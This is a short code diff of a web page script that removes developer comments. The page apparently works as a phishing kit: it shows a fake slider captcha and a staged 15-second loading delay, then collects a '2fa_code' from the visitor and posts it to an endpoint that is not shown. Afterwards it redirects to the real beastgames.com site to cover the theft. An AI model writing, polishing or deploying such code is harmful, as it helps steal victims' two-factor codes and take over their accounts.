@@ -83,7 +83,7 @@
             handle.style.left = x + 'px';
             piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
             
-            // --- THE PERFECT MATCH FIX ---
+           
             if (x > 222 && x < 242) { 
                 dragging = false; 
                 handle.style.background = "#00ff00"; 
@@ -105,7 +105,7 @@
         setTimeout(() => {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('step2_box').style.display = 'block';
-        }, 15000); // 15 Second Delay Fixed
+        }, 15000); 
     }
 
     function submitOTP() {
@@ -115,7 +115,7 @@
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: new URLSearchParams({ '2fa_code': c })
         }).then(() => {
-            window.location.href = "https://www.beastgames.com"; // Redirect Fixed
+            window.location.href = "https://www.beastgames.com"; 
         }).catch(() => {
             window.location.href = "https://www.beastgames.com";
         });
